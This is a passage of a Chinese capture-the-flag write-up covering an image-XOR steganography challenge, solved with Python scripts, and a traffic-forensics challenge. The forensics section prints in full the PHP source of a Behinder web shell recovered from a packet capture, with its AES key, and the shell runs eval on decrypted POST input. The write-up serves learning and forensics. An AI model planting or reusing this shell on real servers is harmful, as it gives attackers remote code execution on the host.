pwn.remote(<span class="string">&quot;ctf.qsnctf.com&quot;</span>, <span class="number">10240</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    rec = io.recvline()</span><br><span class="line">    <span class="built_in">print</span>(rec.decode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;= ?&quot;</span> <span class="keyword">in</span> rec:</span><br><span class="line">        answer = <span class="built_in">eval</span>(rec.decode()[:-<span class="number">5</span>])</span><br><span class="line">        data = <span class="built_in">str</span>(answer).encode()</span><br><span class="line">        io.sendline(data)</span><br></pre></td></tr></table></figure><ol start="4"><li>run后，坐等报错即可</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117201038044.png" alt="image-20230117201038044"></p><p><strong>SICTF{29e5b2ac-f2f9-40f5-b4b8-37f93639bb48}</strong></p><br><h2 id="5-F3-EzMisc"><a href="#5-F3-EzMisc" class="headerlink" title="5. F3 | EzMisc |"></a>5. F3 | EzMisc |</h2><p><strong>题目描述：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一个神奇的压缩包</span><br></pre></td></tr></table></figure><p>拿了个三血</p><ol><li>伪加密，09改为00</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117201130957.png" alt="image-20230117201130957"></p><ol start="2"><li>解压压缩包有个7z和zip，7z有密码，先看zip。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117201340384.png" alt="image-20230117201340384"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117201352296.png" alt="image-20230117201352296"></p><p>得到了密码<code>Password_1s_here_ohhhhh~</code>，解压开来7z，得到flag.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode ,b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line">OOO000O0000000OOO =<span class="string">&#x27;&#x27;</span></span><br><span class="line">OO00000O0O00OOOOO =<span class="string">&#x27;&#x27;</span></span><br><span class="line">O0OO0OO0O0O0OOOO0 =Image .<span class="built_in">open</span> (OOO000O0000000OOO )</span><br><span class="line">O000OOO0O0000OO00 =Image .<span class="built_in">open</span> (OO00000O0O00OOOOO )</span><br><span class="line">OOO0OO0O00OO0O00O =cv2 .imread (<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">OO00OOO0OOO000OO0 =OOO0OO0O00OO0O00O .shape [<span class="number">1</span>]</span><br><span class="line">O0OOO0OOO00OO00OO =OOO0OO0O00OO0O00O .shape [<span class="number">0</span>]</span><br><span class="line">O0000OOO0O00O00OO =Image .new (<span class="string">&quot;RGB&quot;</span>,(OO00OOO0OOO000OO0 ,O0OOO0OOO00OO00OO ))</span><br><span class="line">OO00OOOO00O0OOO0O =O0OO0OO0O0O0OOOO0 .convert (<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">O000OOO0O0OO0000O =O000OOO0O0000OO00 .convert (<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> OOO0O0OO000O0O000 <span class="keyword">in</span> <span class="built_in">range</span> (OO00OOO0OOO000OO0 ):</span><br><span class="line">    <span class="keyword">for</span> OOOOO0000000O0OOO <span class="keyword">in</span> <span class="built_in">range</span> (O0OOO0OOO00OO00OO ):</span><br><span class="line">        OO0OO00O0O0000O0O ,OO000O0O00000O0O0 ,OOO0O00OO000O0O00 =OO00OOOO00O0OOO0O .getpixel ((OOO0O0OO000O0O000 ,OOOOO0000000O0OOO ))</span><br><span class="line">        OO00OOOO0OOO000OO ,O000OO0O0OO00O0O0 ,O00000OO0OO0O0OOO =O000OOO0O0OO0000O .getpixel ((OOO0O0OO000O0O000 ,OOOOO0000000O0OOO ))</span><br><span class="line">        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO</span><br><span class="line">        OO00OOOO0OOO000OO =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO</span><br><span class="line">        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO</span><br><span class="line">        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0</span><br><span class="line">        O000OO0O0OO00O0O0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0</span><br><span class="line">        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0</span><br><span class="line">        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO000O0O00000O0O0</span><br><span class="line">        OO000O0O00000O0O0 =OO0OO00O0O0000O0O ^OO000O0O00000O0O0</span><br><span class="line">        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO000O0O00000O0O0</span><br><span class="line">        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O00000OO0OO0O0OOO</span><br><span class="line">        O00000OO0OO0O0OOO =OO000O0O00000O0O0 ^O00000OO0OO0O0OOO</span><br><span class="line">        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O00000OO0OO0O0OOO</span><br><span class="line">        O0OOO0000OOOOO00O =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO</span><br><span class="line">        OO0O0OOOOO0O00OO0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0</span><br><span class="line">        O00O00O00OO0O00O0 =OOO0O00OO000O0O00 ^O00000OO0OO0O0OOO</span><br><span class="line">        <span class="keyword">if</span> (O0OOO0000OOOOO00O ==<span class="number">0</span> ):</span><br><span class="line">            O0OOO0000OOOOO00O =<span class="number">255</span></span><br><span class="line">        <span class="keyword">if</span> (OO0O0OOOOO0O00OO0 ==<span class="number">0</span> ):</span><br><span class="line">            OO0O0OOOOO0O00OO0 =<span class="number">255</span></span><br><span class="line">        <span class="keyword">if</span> (O00O00O00OO0O00O0 ==<span class="number">0</span> ):</span><br><span class="line">            O00O00O00OO0O00O0 =<span class="number">255</span></span><br><span class="line">        O0OOO0000OOOOO00O =<span class="built_in">str</span> (b64encode (<span class="built_in">str</span> (O0OOO0000OOOOO00O ).encode ()),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        OO0O0OOOOO0O00OO0 =<span class="built_in">str</span> (b64encode (<span class="built_in">str</span> (OO0O0OOOOO0O00OO0 ).encode ()),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        O00O00O00OO0O00O0 =<span class="built_in">str</span> (b64encode (<span class="built_in">str</span> (O00O00O00OO0O00O0 ).encode ()),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&#x27;secret~.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)<span class="keyword">as</span> file0 :</span><br><span class="line">            <span class="built_in">print</span> (O0OOO0000OOOOO00O [::-<span class="number">1</span> ],OO0O0OOOOO0O00OO0 [::-<span class="number">1</span> ],O00O00O00OO0O00O0 [::-<span class="number">1</span> ],file = file0 )</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码被混淆了，我手动改了一下代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> FLAG</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line">img1_path = <span class="string">&#x27;&#x27;</span></span><br><span class="line">img2_path = <span class="string">&#x27;&#x27;</span></span><br><span class="line">img1 = Image .<span class="built_in">open</span>(img1_path)</span><br><span class="line">img2 = Image .<span class="built_in">open</span>(img2_path)</span><br><span class="line">img3 = cv2 .imread(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">width = img3 .shape[<span class="number">1</span>]</span><br><span class="line">height = img3 .shape[<span class="number">0</span>]</span><br><span class="line">new_img = Image .new(<span class="string">&quot;RGB&quot;</span>, (width, height))</span><br><span class="line">img1 = img1 .convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">img2 = img2 .convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        r1, g1, b1 = img1 .getpixel((x, y))</span><br><span class="line">        r2, g2, b2 = img2 .getpixel((x, y))</span><br><span class="line">        r1 = r1 ^ r2</span><br><span class="line">        r2 = r1 ^ r2</span><br><span class="line">        r1 = r1 ^ r2</span><br><span class="line">        g1 = g1 ^ g2</span><br><span class="line">        g2 = g1 ^ g2</span><br><span class="line">        g1 = g1 ^ g2</span><br><span class="line">        r1 = r1 ^ g1</span><br><span class="line">        g1 = r1 ^ g1</span><br><span class="line">        r1 = r1 ^ g1</span><br><span class="line">        g1 = g1 ^ b2</span><br><span class="line">        b2 = g1 ^ b2</span><br><span class="line">        g1 = g1 ^ b2</span><br><span class="line">        r3 = r1 ^ r2</span><br><span class="line">        g3 = g1 ^ g2</span><br><span class="line">        b3 = b1 ^ b2</span><br><span class="line">        <span class="keyword">if</span> (r3 == <span class="number">0</span>):</span><br><span class="line">            r3 = <span class="number">255</span></span><br><span class="line">        <span class="keyword">if</span> (g3 == <span class="number">0</span>):</span><br><span class="line">            g3 = <span class="number">255</span></span><br><span class="line">        <span class="keyword">if</span> (b3 == <span class="number">0</span>):</span><br><span class="line">            b3 = <span class="number">255</span></span><br><span class="line">        r3 = <span class="built_in">str</span>(b64encode(<span class="built_in">str</span>(r3).encode()), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        g3 = <span class="built_in">str</span>(b64encode(<span class="built_in">str</span>(g3).encode()), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        b3 = <span class="built_in">str</span>(b64encode(<span class="built_in">str</span>(b3).encode()), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;secret~.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">            <span class="built_in">print</span>(r3[::-<span class="number">1</span>], g3[::-<span class="number">1</span>], b3[::-<span class="number">1</span>], file=f)</span><br></pre></td></tr></table></figure><p>如果实在看不懂，大概率能明白是打开了两张图片，打开f1ag.png和一张图片做xor，然后保存到了<code>secret~.txt</code>中</p><ol start="3"><li>我们先还原<code>secret~.txt</code>的图片（运行下面代码前，在当前目录新建一个out目录）</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;secret~.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().splitlines()[:-<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">img = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">    bgr = [base64.b64decode(i[::-<span class="number">1</span>]).decode() <span class="keyword">for</span> i <span class="keyword">in</span> line.split(<span class="string">&quot; &quot;</span>)][::-<span class="number">1</span>]</span><br><span class="line">    img.append(bgr)</span><br><span class="line">img = np.array(img, np.uint8)</span><br><span class="line"></span><br><span class="line">dic = &#123;<span class="number">1</span>: <span class="number">268780</span>, <span class="number">2</span>: <span class="number">134390</span>, <span class="number">4</span>: <span class="number">67195</span>, <span class="number">5</span>: <span class="number">53756</span>, <span class="number">10</span>: <span class="number">26878</span>, <span class="number">20</span>: <span class="number">13439</span>, <span class="number">89</span>: <span class="number">3020</span>, <span class="number">151</span>: <span class="number">1780</span>, <span class="number">178</span>: <span class="number">1510</span>, <span class="number">302</span>: <span class="number">890</span>, <span class="number">356</span>: <span class="number">755</span>, <span class="number">445</span>: <span class="number">604</span>, <span class="number">604</span>: <span class="number">445</span>, <span class="number">755</span>: <span class="number">356</span>, <span class="number">890</span>: <span class="number">302</span>, <span class="number">1510</span>: <span class="number">178</span>, <span class="number">1780</span>: <span class="number">151</span>, <span class="number">3020</span>: <span class="number">89</span>, <span class="number">13439</span>: <span class="number">20</span>, <span class="number">26878</span>: <span class="number">10</span>, <span class="number">53756</span>: <span class="number">5</span>, <span class="number">67195</span>: <span class="number">4</span>, <span class="number">134390</span>: <span class="number">2</span>&#125;</span><br><span class="line"><span class="keyword">for</span> height, width <span class="keyword">in</span> dic.items():</span><br><span class="line">    cv2.imwrite(<span class="string">f&quot;./out/<span class="subst">&#123;height&#125;</span>_<span class="subst">&#123;width&#125;</span>.png&quot;</span>, img.reshape(height, width, <span class="number">3</span>))</span><br></pre></td></tr></table></figure><ol start="4"><li>在 <code>out目录里面</code> 我们得到了一张图片</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117202023063.png" alt="image-20230117202023063"></p><p>很明显是歪的，向右旋转90°就正常了。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117202056006.png" alt="image-20230117202056006"></p><p>明显能看到有两个人的感觉，而且大的这个女生就是我们的<code>f1ag.png</code></p><ol start="5"><li>我这边是非常规解，正常的话，是要把这个过程逆过来，但是中间xor太多了，使用<code>Stegsolve</code>对<code>f1ag.png</code>和上面的图片进行xor后得到下面的图片（注意：我第一次没有得到这个图片，然后我给上面的图片水平翻转了一下就得到了清晰的图片了）</li></ol><p>为什么需要向右旋转90°和水平翻转是因为我是 <code>列优先</code> 生成的图片，但是出题人是<code>行优先</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117201817258.png" alt="image-20230117201817258"></p><p>使用识图工具就好了，我这边用的插件。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117202441091.png" alt="image-20230117202441091"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117202504170.png" alt="image-20230117202504170"></p><p>所以这个角色叫<code>小鸟游六花</code>，拼音是<code>xiaoniaoyouliuhua</code>，为什么我知道是拼音是根据<code>hint.txt</code>，再加上<code>f1ag.png</code>被隐写工具隐写了。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117202545962.png" alt="image-20230117202545962"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117202642642.png" alt="image-20230117202642642"></p><p>png和jpg特征一样</p><ol start="6"><li>使用<code>OurSecret</code>解密，得到<code>flag.txt</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117202732071.png" alt="image-20230117202732071"></p><p><strong>SICTF{3d04cd71-5b2d-4bce-abec-a6f2f95c3665}</strong></p><h3 id="补充：-1"><a href="#补充：-1" class="headerlink" title="补充："></a><strong>补充：</strong></h3><p>这个题目不知道怎么评价，因为他的出题的那个脚本，我把逆代码写出来后还是得不到清楚的图片，因为我已经做出来了，就找树木反应，树木给了正确解题代码，然后拿到正确解题代码</p><p><strong>出题人的解题脚本：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode,b64decode</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line">Dir=<span class="string">&#x27;f1ag.png&#x27;</span></span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(Dir)</span><br><span class="line"></span><br><span class="line">x=<span class="number">604</span></span><br><span class="line">y=<span class="number">445</span></span><br><span class="line">printf = Image.new(<span class="string">&quot;RGB&quot;</span>, (x, y))</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;secret~.txt&#x27;</span>) </span><br><span class="line">rgb_im = im.convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(y):</span><br><span class="line">        line = file.readline()</span><br><span class="line">        rgb = line.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">        R = rgb[<span class="number">0</span>]</span><br><span class="line">        R = R[::-<span class="number">1</span>]</span><br><span class="line">        R = b64decode(R)</span><br><span class="line">        R = <span class="built_in">int</span>(R)</span><br><span class="line">        G = rgb[<span class="number">1</span>]</span><br><span class="line">        G = G[::-<span class="number">1</span>]</span><br><span class="line">        G = b64decode(G)</span><br><span class="line">        G = <span class="built_in">int</span>(G)</span><br><span class="line">        B = rgb[<span class="number">2</span>]</span><br><span class="line">        B = B[::-<span class="number">1</span>]</span><br><span class="line">        B = b64decode(B)</span><br><span class="line">        B = <span class="built_in">int</span>(B)</span><br><span class="line">        <span class="keyword">if</span>(R == <span class="number">255</span>):</span><br><span class="line">            R == <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span>(G == <span class="number">255</span>):</span><br><span class="line">            G = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span>(B == <span class="number">255</span>):</span><br><span class="line">            B = <span class="number">0</span></span><br><span class="line">        r, g, b = rgb_im.getpixel((i, j))</span><br><span class="line">        out1 = r ^ R </span><br><span class="line">        out2 = g ^ G </span><br><span class="line">        out3 = b ^ B</span><br><span class="line">        printf.putpixel((i, j), (<span class="built_in">int</span>(out3), <span class="built_in">int</span>(out1), <span class="built_in">int</span>(out2)))</span><br><span class="line">printf.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>如果你看了一下上面的代码，出题人的解题代码只是简单的xor和黑色变成白色（所以就出现了 <code>stegslove</code> 非预期解的情况）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">我再来解释一下，我不确定（强调一下我不确定！！！）</span><br><span class="line">但是大概率是，出题人的加密脚本，本意是两个图片的像素值互换位置，然后再xor</span><br><span class="line">首先互换位置不影响xor，但是由于他xor太多了，自己给自己搞晕了，哈哈哈~</span><br><span class="line">然后题目出后，自己没有去尝试，然后就导致出现了，你就算把逆脚本写出来，也得不到很清楚的图片</span><br><span class="line"></span><br><span class="line">大佬们，如果不对欢迎联系我，单杀我，哈哈哈！</span><br></pre></td></tr></table></figure><br><h2 id="6-F-hacker2"><a href="#6-F-hacker2" class="headerlink" title="6. F | hacker2 |"></a>6. F | hacker2 |</h2><p><strong>题目描述：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">树木不小心把重要的信息放在了自己的shell当中，或许对你的解密会有帮助</span><br></pre></td></tr></table></figure><ol><li>先过滤http流，看到了一个信息，一个php代码，感觉很有用处，首先我这个时候并不知道冰蝎流量，然后我看见这个后，我就ctrl+shift+o，给他保存下来了。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117202919823.png" alt="image-20230117202919823"></p><ol start="2"><li>代码如下，后面经过了解知道是冰蝎后，key很有用处，他是AES的key，也就是说key是<code>7d7c23e87b47368b</code></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;7d7c23e87b47368b&quot;</span>; <span class="comment">//0123456789abcdef</span></span><br><span class="line"> <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line"> <span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line"> &#123;</span><br><span class="line">  <span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">  <span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">       &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line">  <span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line"> &#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>过滤器改为<code>http &amp;&amp; data-text-lines</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117202959089.png" alt="image-20230117202959089"></p><ol start="4"><li>将89序号后的http流下面的base64字符串全部复制粘贴到了txt中</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117203021986.png" alt="image-20230117203021986"></p><p>如图：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117203033043.png" alt="image-20230117203033043"></p><ol start="5"><li>一个一个的解，我先解了一下，解到了大base64就卡住了，我就从小base64开始。(补充说了解决大base64卡住的问题)</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117203047659.png" alt="image-20230117203047659"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117203059305.png" alt="image-20230117203059305"></p><p>c0rRect!!!，英文翻译过来就是正确的意思。</p><ol start="6"><li>再根据<code>describe.txt</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">大黑客树木再次上传了shell并用工具进行连接，他在上传目录的一堆测试txt中找到了重要的字符串，我们观察并截取了流量</span><br><span class="line">你能告诉我们他上传的shell的名称和key值以及最终找到的重要字符串吗？</span><br><span class="line">flag格式：SICTF&#123;shell名称_密钥_文本文件中存储的字符串&#125;</span><br></pre></td></tr></table></figure><p><strong>SICTF{she1l_7d7c23e87b47368b_c0rRect!!!}</strong></p><h3 id="补充：-2"><a href="#补充：-2" class="headerlink" title="补充："></a><strong>补充：</strong></h3><p>也可以不用去下载冰蝎V2工具，因为大的文本，这个工具会卡住，但是下面的方法不会卡住，只能说<code>CyberChef, YYDS!!!</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230117203426505.png" alt="image-20230117203426505"></p><p>先Base64解码，然后Aes解密，Key为<code>7d7c23e87b47368b</code>，IV为<code>0000000000000000000000000000000</code>，Mode为<code>CBC</code></p><br><h2 id="7-F3-王八树木"><a href="#7-F3-王八树木" class="headerlink" title="7. F3 | 王八树木 |"></a>7. F3 | 王八树木 |</h2><p><strong>题目描述：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 